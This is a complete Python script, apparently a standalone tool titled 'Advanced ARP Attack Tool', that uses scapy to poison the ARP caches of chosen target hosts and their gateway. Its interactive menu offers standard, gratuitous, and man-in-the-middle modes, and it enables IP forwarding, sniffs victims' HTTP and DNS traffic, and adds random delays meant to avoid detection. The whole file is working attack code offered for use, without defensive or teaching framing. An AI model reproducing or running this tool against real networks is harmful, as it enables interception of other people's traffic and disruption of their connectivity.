from scapy.all import *
import psutil
import socket
import uuid
import threading
import queue
import time
import random
import logging
import sys
import os
import re
import colorama
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, Back

# Initialize color output
colorama.init(autoreset=True)

def get_network_interfaces():
    """Get active network interfaces"""
    return [
        iface for iface, addrs in psutil.net_if_addrs().items() 
        if any(addr.family == socket.AF_INET for addr in addrs)
    ]

def get_local_mac():
    """Get the local MAC address"""
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

def get_local_ip(interface=None):
    """Get the IP address of the specified interface"""
    if interface:
        addrs = psutil.net_if_addrs()
        for addr in addrs.get(interface, []):
            if addr.family == socket.AF_INET:
                return addr.address
    return None

def validate_ip(ip):
    """Verify that the IP address is valid"""
    pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    match = re.match(pattern, ip)
    if not match:
        return False
    
    for i in range(1, 5):
        octet = int(match.group(i))
        if octet < 0 or octet > 255:
            return False
    
    return True

class AdvancedARPSpoofing:
    def __init__(self, gateway, targets, interface):
        """
        Initialize the ARP spoofing attacker
        
        :param gateway: Gateway IP address
        :param targets: Target IP address list
        :param interface: Network interface name
        """
        self.gateway = gateway
        self.targets = targets
        self.interface = interface
        
        # Get local MAC and IP
        self.local_mac = get_local_mac()
        self.local_ip = get_local_ip(interface)
        
        # Set stop events and thread list
        self.stop_event = threading.Event()
        self.attack_threads = []
        self.attack_timer = None
        
        # MAC address cache
        self.mac_cache = {}
        
        # Log queue and log configuration
        self.attack_log_queue = queue.Queue()
        
        # Setting up logging
        self.logger = logging.getLogger("arp_spoof")
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # Adding a console processor
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
        
        # Adding a file handler
        try:
            file_handler = logging.FileHandler("arp_attack.log")
            file_handler.setFormatter(formatter)
            self.logger.addHandler(file_handler)
        except:
            pass  # Fail silently if log file cannot be created
    
    def _get_mac_address(self, ip):
        """
        Get the MAC address of the specified IP
        
        :param ip: Target IP
        :return: MAC address or None
        """
        # First check the cache
        if ip in self.mac_cache:
            return self.mac_cache[ip]
        
        try:
            # Create an ARP request packet
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            
            # Send a packet and wait for a response
            result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            
            # Extract the MAC address of the response
            if result:
                mac = result[0][1].hwsrc
                # Save to cache
                self.mac_cache[ip] = mac
                return mac
            else:
                return None
        except Exception as e:
            self.logger.error(f"Failed to obtain MAC address: {e}")
            return None
    
    def _standard_arp_spoof(self, target_ip, spoof_ip):
        """
        Perform standard ARP spoofing
        
        :param target_ip: Target IP
        :param spoof_ip: Spoof IP (usually gateway)
        """
        try:
            # Get the target MAC address
            target_mac = self._get_mac_address(target_ip)
            if not target_mac:
                self.attack_log_queue.put(
                    f"{Fore.RED}[!] Unable to obtain MAC address of {target_ip}{Style.RESET_ALL}"
                )
                return
            
            # Create ARP spoofing packets
            arp_response = ARP(
                op=2,           # 2 indicates ARP response
                pdst=target_ip, # Target IP
                hwdst=target_mac, # Target MAC
                psrc=spoof_ip   # Source IP (disguised as gateway)
            )
            
            # Sending Data Packets
            send(arp_response, verbose=False, iface=self.interface)
            
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] Send standard ARP spoof {Style.RESET_ALL} to {target_ip}"
            )
            
        except Exception as e:
            self.logger.error(f"Standard ARP spoofing failed: {e}")
    
    def _gratuitous_arp_attack(self, target_ip, spoof_ip):
        """
        Performing a Gratuitous ARP Attack
        
        :param target_ip: Target IP
        :param spoof_ip: Spoof IP (usually gateway)
        """
        try:
            # Send a gratuitous ARP to the target
            gratuitous_packet = ARP(
                op=1,
                psrc=spoof_ip,
                pdst=target_ip,
                hwsrc=self.local_mac,
                hwdst="ff:ff:ff:ff:ff:ff"
            )
            
            # Sending Data Packets
            send(gratuitous_packet, verbose=False, iface=self.interface)
            
            self.attack_log_queue.put(
                f"{Fore.MAGENTA}[+] Send gratuitous ARP attack to {target_ip} {Style.RESET_ALL}"
            )
            
        except Exception as e:
            self.logger.error(f"Gratuitous ARP attack failed: {e}")
    
    def attack_worker(self, strategy):
        """
        Attack Worker Thread
        
        :param strategy: Attack strategy
        """
        while not self.stop_event.is_set():
            try:
                # Perform ARP spoofing on each target
                for target in self.targets:
                    # Select attack method based on strategy
                    if strategy == 'standard' or strategy == 'mitm':
                        # Trick the target into thinking we are the gateway
                        self._standard_arp_spoof(target, self.gateway)
                        
                        # For MITM attacks, also spoof the gateway
                        if strategy == 'mitm':
                            self._standard_arp_spoof(self.gateway, target)
                    
                    elif strategy == 'gratuitous':
                        # Performing a Gratuitous ARP Attack
                        self._gratuitous_arp_attack(target, self.gateway)
                    
                    # Random delay to avoid detection
                    time.sleep(random.uniform(1.0, 3.0))
                    
                    # Check if it is stopped
                    if self.stop_event.is_set():
                        break
                
            except Exception as e:
                self.logger.error(f"Attack thread error: {e}")
                time.sleep(1)
    
    def enable_ip_forwarding(self):
        """
        Enable IP forwarding, allowing an attacker to forward traffic as a man-in-the-middle
        """
        try:
            # Detect the operating system and enable IP forwarding
            if sys.platform.startswith('win'):
                # Windows
                os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Windows IP forwarding is enabled{Style.RESET_ALL}"
                )
            else:
                # Linux/Unix
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Linux IP forwarding enabled {Style.RESET_ALL}"
                )
            return True
        except Exception as e:
            self.attack_log_queue.put(
                f"{Fore.RED}[!] Failed to enable IP forwarding: {e}{Style.RESET_ALL}"
            )
            return False

    def disable_ip_forwarding(self):
        """
        Disable IP forwarding and restore system settings
        """
        try:
            if sys.platform.startswith('win'):
                os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Windows IP forwarding disabled {Style.RESET_ALL}"
                )
            else:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                self.attack_log_queue.put(
                    f"{Fore.GREEN}[+] Linux IP forwarding disabled {Style.RESET_ALL}"
                )
            return True
        except Exception as e:
            self.attack_log_queue.put(
                f"{Fore.RED}[!] Failed to disable IP forwarding: {e}{Style.RESET_ALL}"
            )
            return False

    def packet_sniffer(self, packet_filter=""):
        """
        Packet sniffer for traffic analysis of MITM attacks
        
        :param packet_filter: Packet filter expressions
        """
        def packet_callback(packet):
            # Avoid excessive CPU usage due to processing too many packets
            if self.stop_event.is_set():
                return
            
            # Extract useful packet information
            if packet.haslayer(TCP) and packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # Handling HTTP traffic
                if packet.haslayer(Raw) and (packet.dport == 80 or packet.sport == 80):
                    try:
                        payload = packet[Raw].load.decode('utf-8', errors='ignore')
                        if "GET " in payload or "POST " in payload:
                            self.attack_log_queue.put(
                                f"{Fore.CYAN}[*] HTTP traffic: {src_ip} -> {dst_ip}{Style.RESET_ALL}"
                            )
                    except:
                        pass
            
            # Handling DNS queries
            elif packet.haslayer(DNS) and packet.haslayer(IP):
                if packet.haslayer(DNSQR):
                    qname = packet[DNSQR].qname.decode('utf-8')
                    self.attack_log_queue.put(
                        f"{Fore.MAGENTA}[*] DNS query: {packet[IP].src} -> {qname}{Style.RESET_ALL}"
                    )

        # Start the sniffing thread
        sniffer_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface,
                filter=packet_filter,
                prn=packet_callback,
                store=0,
                stop_filter=lambda _: self.stop_event.is_set()
            ),
            daemon=True
        )
        sniffer_thread.start()
        self.attack_threads.append(sniffer_thread)
        
        self.attack_log_queue.put(
            f"{Fore.GREEN}[+] Packet sniffer enabled (filter: {packet_filter or 'none'}){Style.RESET_ALL}"
        )

    def monitor_network_activity(self):
        """
        Monitor network activity and handle traffic changes
        """
        try:
            # Initialize traffic counter
            last_check = time.time()
            targets_seen = {target: 0 for target in self.targets}
            
            # Start monitoring thread
            monitor_thread = threading.Thread(
                target=self._network_monitor_worker,
                args=(targets_seen, last_check),
                daemon=True
            )
            monitor_thread.start()
            self.attack_threads.append(monitor_thread)
            
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] Network activity monitoring has been activated{Style.RESET_ALL}"
            )
        except Exception as e:
            self.logger.error(f"Failed to start network monitoring: {e}")

    def _network_monitor_worker(self, targets_seen, last_check):
        """
        Network monitoring worker thread
        
        :param targets_seen: Target traffic counter
        :param last_check: Last checked time
        """
        while not self.stop_event.is_set():
            try:
                # Checks network activity every 30 seconds
                time.sleep(30)
                
                if self.stop_event.is_set():
                    return
                    
                current_time = time.time()
                
                # Check if there are any targets that have not been seen for a long time
                for target in self.targets:
                    if target not in targets_seen or targets_seen[target] < 3:
                        # Increased attack frequency against less active targets
                        self._standard_arp_spoof(target, self.gateway)
                        self._gratuitous_arp_attack(target, self.gateway)
                        
                        self.attack_log_queue.put(
                            f"{Fore.YELLOW}[!] Increases attack power on {target} {Style.RESET_ALL}"
                        )
                
                # Reset Counter
                if current_time - last_check > 300:  # 5 minutes
                    targets_seen = {target: 0 for target in self.targets}
                    last_check = current_time
                    
            except Exception as e:
                self.logger.error(f"Network monitoring error: {e}")
                time.sleep(5)  # Wait briefly after an error

    def setup_attack_environment(self):
        """
        Set up the attack environment and prepare the configuration before the attack
        """
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Backing up the system ARP table
        self._backup_arp_table()
        
        # Set the attack timer
        self.attack_timer = threading.Timer(3600, self._refresh_attack)  # Refresh every hour
        self.attack_timer.daemon = True
        
        return True

    def _backup_arp_table(self):
        """
        Back up the system ARP table for subsequent restoration
        """
        try:
            self.arp_backup = {}
            
            # Get the current ARP table
            for target in self.targets + [self.gateway]:
                mac = self._get_mac_address(target)
                if mac:
                    self.arp_backup[target] = mac
                    
            self.attack_log_queue.put(
                f"{Fore.GREEN}[+] ARP table backup completed ({len(self.arp_backup)} records){Style.RESET_ALL}"
            )
        except Exception as e:
            self.logger.error(f"ARP table backup failed: {e}")

    def _refresh_attack(self):
        """
        Refresh attacks to prevent detection or failure
        """
        if self.stop_event.is_set():
            return
            
        self.attack_log_queue.put(
            f"{Fore.MAGENTA}[*] Refreshing attacks... {Style.RESET_ALL}"
        )
        
        # Clear MAC Cache
        self.mac_cache.clear()
        
        # Performs a powerful attack on all targets
        for target in self.targets:
            self._standard_arp_spoof(target, self.gateway)
            self._gratuitous_arp_attack(target, self.gateway)
            
        # Restart Timer
        self.attack_timer = threading.Timer(3600, self._refresh_attack)
        self.attack_timer.daemon = True
        self.attack_timer.start()

    def start_attack(self, strategy='standard', threads=10, duration=None):
        """
        Launch the attack
        
        :param strategy: Attack strategy
        :param threads: Number of concurrent threads
        :param duration: Attack duration (seconds)
        """
        print(f"{Fore.GREEN}[*] Start ARP attack {Style.RESET_ALL}")
        print(f"targets: {', '.join(self.targets)}")
        print(f"Gateway: {self.gateway}")
        print(f"Attack strategy: {strategy}")
        print(f"Local MAC: {self.local_mac}")
        print(f"Local IP: {self.local_ip}")
        
        start_time = time.time()
        
        # Reset state
        self.stop_event.clear()
        self.mac_cache.clear()
        
        # Setting up the attack environment
        self.setup_attack_environment()
        
        # Create and start the attack thread
        self.attack_threads = []
        for _ in range(threads):
            thread = threading.Thread(
                target=self.attack_worker,
                args=(strategy,),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
        
        # Start network monitoring
        self.monitor_network_activity()
        
        # For MITM attacks, start packet sniffing
        if strategy == 'mitm':
            self.packet_sniffer("ip")
        
        # Start attack refresh timer
        self.attack_timer.start()
        
        # If a duration is set, the attack will stop after the specified time.
        if duration:
            try:
                # Wait for a specified time without blocking
                time_to_wait = start_time + duration - time.time()
                if time_to_wait > 0:
                    print(f"{Fore.YELLOW}[*] The attack will automatically stop after {duration} seconds {Style.RESET_ALL}")
                    time.sleep(time_to_wait)
                self.stop_attack()
            except KeyboardInterrupt:
                self.stop_attack()
        else:
            # Attacks indefinitely until Ctrl+C
            try:
                print(f"{Fore.YELLOW}[*] Attack in progress, press Ctrl+C to stop...{Style.RESET_ALL}")
                # The main thread waits to keep the program running
                while not self.stop_event.is_set():
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()

    def stop_attack(self):
        """
        Stop all attack threads immediately
        """
        print(f"\n{Fore.RED}[!] Stopping attack...{Style.RESET_ALL}")
        self.stop_event.set()
        
        # Stop Timer
        if hasattr(self, 'attack_timer') and self.attack_timer:
            self.attack_timer.cancel()
        
        # Force waiting for all threads to terminate, up to 5 seconds
        wait_time = 0
        while any(t.is_alive() for t in self.attack_threads) and wait_time < 5:
            time.sleep(0.5)
            wait_time += 0.5
        
        # If there are still threads active, print a warning
        if any(t.is_alive() for t in self.attack_threads):
            print(f"{Fore.RED}[!] Some attack threads are still running, force to continue...{Style.RESET_ALL}")
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        print(f"{Fore.GREEN}[✓] Attack stopped{Style.RESET_ALL}")

    def restore_arp_table(self):
        """
        Restore the ARP table
        """
        print(f"{Fore.CYAN}[*] Performing network restore... {Style.RESET_ALL}")
        
        # Make sure the attack has stopped
        self.stop_event.set()
        
        # Waiting for a thread to terminate
        time.sleep(1)
        
        for target in self.targets:
            try:
                target_mac = self.arp_backup.get(target) if hasattr(self, 'arp_backup') else self._get_mac_address(target)
                gateway_mac = self.arp_backup.get(self.gateway) if hasattr(self, 'arp_backup') else self._get_mac_address(self.gateway)
                
                if not target_mac or not gateway_mac:
                    continue
                
                # Send the correct gateway MAC to the target
                restore_target = ARP(
                    op=2, 
                    pdst=target, 
                    hwdst=target_mac, 
                    psrc=self.gateway, 
                    hwsrc=gateway_mac
                )
                
                # Send the correct destination MAC to the gateway
                restore_gateway = ARP(
                    op=2, 
                    pdst=self.gateway, 
                    hwdst=gateway_mac, 
                    psrc=target, 
                    hwsrc=target_mac
                )
                
                # Send multiple times to ensure the restore is successful
                for _ in range(5):
                    send(restore_target, verbose=False)
                    send(restore_gateway, verbose=False)
                    time.sleep(0.2)
                
                print(f"{Fore.GREEN}[✓] Restored the ARP table of {target}{Style.RESET_ALL}")
                
            except Exception as e:
                self.logger.error(f"Restoring {target} failed: {e}")
        
        # Send an additional gratuitous ARP broadcast to speed up updates
        try:
            for ip, mac in self.arp_backup.items() if hasattr(self, 'arp_backup') else []:
                gratuitous_packet = ARP(
                    op=1,
                    psrc=ip,
                    pdst=ip,
                    hwsrc=mac,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                send(gratuitous_packet, verbose=False, count=2)
        except Exception as e:
            self.logger.error(f"Failed to send gratuitous ARP update: {e}")

def main():
    try:
        print(f"{Fore.MAGENTA}")
        print("=" * 50)
        print("🔥 Advanced ARP Attack Tool v1.0 🔥".center(50))
        print("=" * 50)
        print(f"{Style.RESET_ALL}")
        
        # Network interface selection
        interfaces = get_network_interfaces()
        print(f"{Fore.MAGENTA} Available network interfaces: {Style.RESET_ALL}")
        for idx, interface in enumerate(interfaces, 1):
            print(f"{idx}. {interface}")
        
        interface_choice = input(f"{Fore.CYAN}Select network interface (serial number): {Style.RESET_ALL}").strip()
        interface = interfaces[int(interface_choice) - 1]
        
        # Gateway Input
        while True:
            gateway = input(f"{Fore.CYAN} Input gateway IP: {Style.RESET_ALL}").strip()
            if validate_ip(gateway):
                break
            print(f"{Fore.RED}[!] Invalid IP address {Style.RESET_ALL}")
        
        # Target Input
        targets = []
        while True:
            target_input = input(f"{Fore.CYAN} Input the target IP (separate multiple IP addresses with commas and press Enter): {Style.RESET_ALL}").strip()
            
            if not target_input:
                break
            
            target_ips = [ip.strip() for ip in target_input.split(',')]
            valid_targets = [ip for ip in target_ips if validate_ip(ip)]
            
            if valid_targets:
                targets.extend(valid_targets)
                print(f"{Fore.GREEN}[+] Target added: {', '.join(valid_targets)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] No valid IP detected {Style.RESET_ALL}")
        
        if not targets:
            print(f"{Fore.RED}[!] No valid target specified {Style.RESET_ALL}")
            return
        
        # Attack strategy selection
        print(f"\n{Fore.GREEN} Available attack strategies:{Style.RESET_ALL}")
        print("1. Standard ARP attack (standard)")
        print("2. Free ARP attack (gratuitous)")
        print("3. MITM (Man-in-the-Middle Attack)")
        
        strategy_map = {
            '1': 'standard', 
            '2': 'gratuitous', 
            '3': 'mitm'
        }
        
        strategy_choice = input(f"{Fore.YELLOW} Select attack strategy (1-3): {Style.RESET_ALL}").strip()
        strategy = strategy_map.get(strategy_choice, 'standard')
        
        # New option: whether to enable packet sniffing
        enable_sniffing = False
        if strategy == 'mitm':
            sniff_choice = input(f"{Fore.YELLOW}Do you want to enable packet sniffing? (y/n): {Style.RESET_ALL}").strip().lower()
            enable_sniffing = sniff_choice == 'y'
        
        # Attack duration selection
        while True:
            try:
                duration_input = input(f"{Fore.CYAN} Enter the attack duration (seconds). Leave it blank for continuous attack by default: {Style.RESET_ALL}").strip()
                
                if not duration_input:
                    duration = None
                    break
                
                duration = int(duration_input)
                if duration > 0:
                    break
                else:
                    print(f"{Fore.RED}[!] Duration must be a positive integer {Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a valid number {Style.RESET_ALL}")
        
        # Concurrent thread number selection
        while True:
            try:
                threads_input = input(f"{Fore.CYAN} Enter the number of concurrent threads (default 10): {Style.RESET_ALL}").strip()
                
                if not threads_input:
                    threads = 10
                    break
                
                threads = int(threads_input)
                if 1 <= threads <= 50:
                    break
                else:
                    print(f"{Fore.RED}[!] The number of threads must be between 1 and 50 {Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a valid number {Style.RESET_ALL}")
        
        # Creating an attack instance
        arp_attack = AdvancedARPSpoofing(gateway, targets, interface)
        
        try:
            # Begin the attack
            arp_attack.start_attack(strategy, threads, duration)
        
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack manually interrupted {Style.RESET_ALL}")
        
        finally:
            # Ensure network is restored
            print(f"{Fore.GREEN}[*] Performing network restore...{Style.RESET_ALL}")
            arp_attack.restore_arp_table()
            print(f"{Fore.GREEN}[✓] Network has been successfully restored {Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error occurred during execution: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()